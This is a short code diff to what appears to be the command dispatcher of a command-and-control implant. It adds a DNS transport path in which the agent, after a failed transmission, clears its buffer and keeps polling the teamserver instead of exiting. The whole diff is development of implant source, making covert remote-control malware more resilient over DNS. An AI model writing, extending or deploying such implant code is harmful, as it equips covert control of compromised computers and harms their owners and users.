@@ -74,11 +74,23 @@ VOID CommandDispatcher( VOID )
             continue;
         }
 
-#ifdef TRANSPORT_HTTP
+#if defined( TRANSPORT_HTTP ) || defined( TRANSPORT_DNS )
         /* Send our buffer. */
-        if ( ! PackageTransmitAll( &DataBuffer, &DataBufferSize ) && ! HostCheckup() )
+        if ( ! PackageTransmitAll( &DataBuffer, &DataBufferSize ) )
         {
-            CommandExit( NULL );
+#ifdef TRANSPORT_HTTP
+            if ( ! HostCheckup() )
+            {
+                CommandExit( NULL );
+            }
+#else
+            /* DNS is request/response like HTTP, but a lost datagram is not a
+             * reason to kill the agent. The next poll retries the message and
+             * the teamserver answers from its cache. */
+            DataBuffer     = NULL;
+            DataBufferSize = 0;
+            continue;
+#endif
         }
 
 /* SMB */
